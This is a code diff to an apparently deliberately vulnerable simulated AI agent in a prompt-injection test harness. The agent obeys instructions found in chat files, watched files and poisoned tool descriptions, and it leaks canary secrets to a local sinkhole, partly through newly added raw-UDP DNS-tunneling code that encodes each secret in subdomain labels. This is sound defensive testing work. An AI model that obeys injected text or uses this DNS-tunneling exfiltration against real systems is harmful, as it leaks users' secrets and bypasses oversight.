@@ -29,11 +29,55 @@ WATCHED_DIR = "/agent/watched"
 CHAT_INBOX_DIR = "/agent/chat_inbox"
 OUTPUT_DIR = "/agent/output"
 
+# Deliberately NOT one of the bind-mounted volumes above -- lives in the
+# container's own writable layer, which `docker restart` preserves (it
+# stops/starts the same container, it doesn't recreate it). A fresh
+# `docker run` (new container) naturally starts with no state file, which
+# is correct: dedup should reset for a genuinely new test run, only survive
+# a same-run restart (needed to pick up tool-poisoning config changes).
+DEDUP_STATE_PATH = "/agent/.dedup_state.json"
+
+# Must match method2/interceptors/dns_sinkhole.py's DEFAULT_PORT. The sinkhole
+# listens on 5353 (not 53) to avoid requiring root, so standard OS-level DNS
+# resolution (always port 53) can never reach it -- we send the query directly.
+DNS_SINKHOLE_HOST = "host.docker.internal"
+DNS_SINKHOLE_PORT = 5353
+
 processed_chat_files = set()
 # Track content hashes of watched files so we only process each file's
 # content once -- a real agent reads a file once during normal operation,
 # not every 3 seconds in an infinite loop.
 watched_file_hashes = {}
+
+
+def load_dedup_state():
+    """Restore dedup state from a prior run of this same container
+    instance, so a mid-run `docker restart` (needed to pick up
+    tool-poisoning config changes) doesn't cause already-processed
+    chat/watched payloads to be re-exfiltrated and double-counted."""
+    global processed_chat_files, watched_file_hashes
+    if os.path.exists(DEDUP_STATE_PATH):
+        try:
+            with open(DEDUP_STATE_PATH, "r") as f:
+                state = json.load(f)
+            processed_chat_files = set(state.get("processed_chat_files", []))
+            watched_file_hashes = state.get("watched_file_hashes", {})
+            print(f"[agent] restored dedup state: "
+                  f"{len(processed_chat_files)} chat file(s), "
+                  f"{len(watched_file_hashes)} watched file(s)")
+        except (json.JSONDecodeError, OSError) as e:
+            print(f"[agent] could not restore dedup state, starting fresh: {e}")
+
+
+def save_dedup_state():
+    try:
+        with open(DEDUP_STATE_PATH, "w") as f:
+            json.dump({
+                "processed_chat_files": list(processed_chat_files),
+                "watched_file_hashes": watched_file_hashes,
+            }, f)
+    except OSError as e:
+        print(f"[agent] could not save dedup state: {e}")
 
 
 def load_env():
@@ -114,21 +158,52 @@ def exfil_http_webhook(url: str, payload: str):
         print(f"[agent] HTTP exfil failed: {e}")
 
 
+def _build_dns_query(domain: str) -> bytes:
+    """Build a minimal, valid DNS query packet (A record) for `domain`.
+    Wire format mirrors what dns_sinkhole.py's parse_dns_query_name() expects."""
+    transaction_id = os.urandom(2)
+    flags = b"\x01\x00"  # standard query, recursion desired
+    counts = b"\x00\x01\x00\x00\x00\x00\x00\x00"  # QDCOUNT=1, rest 0
+    qname = b"".join(
+        bytes([len(label)]) + label.encode()
+        for label in domain.split(".") if label
+    ) + b"\x00"
+    qtype_qclass = b"\x00\x01\x00\x01"  # QTYPE=A, QCLASS=IN
+    return transaction_id + flags + counts + qname + qtype_qclass
+
+
 def exfil_dns_tunnel(domain: str, value: str, attack_id: str = ""):
-    """Channel 2: DNS tunneling -- encode secret in subdomain lookup."""
-    # Sanitize the value for DNS label (replace non-alphanumeric with dashes)
-    sanitized = "".join(c if c.isalnum() else "-" for c in value)
+    """Channel 2: DNS tunneling -- encode secret in subdomain lookup.
+
+    Sends the query directly to the Pillar B sinkhole via a raw UDP packet
+    instead of the OS resolver (socket.getaddrinfo always uses port 53,
+    which the sinkhole -- deliberately on 5353 to avoid needing root --
+    can never receive)."""
+    # Sanitize the value for DNS label. Keep underscores -- canary values are
+    # always formatted like "CANARY_<run_id>", and scan_text_for_canaries()
+    # matches on that literal "CANARY_" prefix; replacing it with a dash
+    # would silently defeat detection.
+    sanitized = "".join(c if (c.isalnum() or c == "_") else "-" for c in value)
     # DNS labels max 63 chars
     sanitized = sanitized[:60]
     lookup_domain = f"{sanitized}.{domain}"
+    sock = None
     try:
         print(f"[agent] DNS exfil: looking up {lookup_domain}")
-        socket.getaddrinfo(lookup_domain, 80)
-    except socket.gaierror:
-        # Expected -- sinkhole won't resolve, but the query itself is the leak
-        print(f"[agent] DNS query sent (resolution failed as expected)")
+        query = _build_dns_query(lookup_domain)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.settimeout(3)
+        sock.sendto(query, (DNS_SINKHOLE_HOST, DNS_SINKHOLE_PORT))
+        try:
+            sock.recvfrom(512)
+        except socket.timeout:
+            pass
+        print(f"[agent] DNS query sent to sinkhole")
     except Exception as e:
         print(f"[agent] DNS exfil error: {e}")
+    finally:
+        if sock:
+            sock.close()
 
 
 def exfil_file_write(filepath: str, key: str, value: str, attack_id: str = ""):
@@ -283,16 +358,22 @@ if __name__ == "__main__":
     # Create output directory for file/exec/package exfiltration channels
     os.makedirs(OUTPUT_DIR, exist_ok=True)
 
+    load_dedup_state()
+    # tools_checked is intentionally NOT persisted: a restart is exactly how
+    # newly-poisoned tool descriptions get picked up, so tool descriptions
+    # must be re-read once after every restart, not just once ever.
     tools_checked = False
 
     while True:
         # Channel 1: direct chat messages (new only, simulating a real inbox)
-        for fname, content in read_new_chat_messages().items():
+        new_chat = read_new_chat_messages()
+        for fname, content in new_chat.items():
             process_instruction(content, env, source=f"direct_chat:{fname}")
 
         # Channel 2: watched files (agent's normal file-reading behavior)
         # Only re-processed when content changes (not every loop)
-        for fname, content in read_watched_files().items():
+        new_watched = read_watched_files()
+        for fname, content in new_watched.items():
             process_instruction(content, env, source=f"watched_file:{fname}")
 
         # Channel 3: tool descriptions (checked once at startup, like a real
@@ -301,5 +382,8 @@ if __name__ == "__main__":
             for tool_name, description in read_tool_descriptions().items():
                 process_instruction(description, env, source=f"tool_description:{tool_name}")
             tools_checked = True
+
+        if new_chat or new_watched:
+            save_dedup_state()
 
         time.sleep(3)
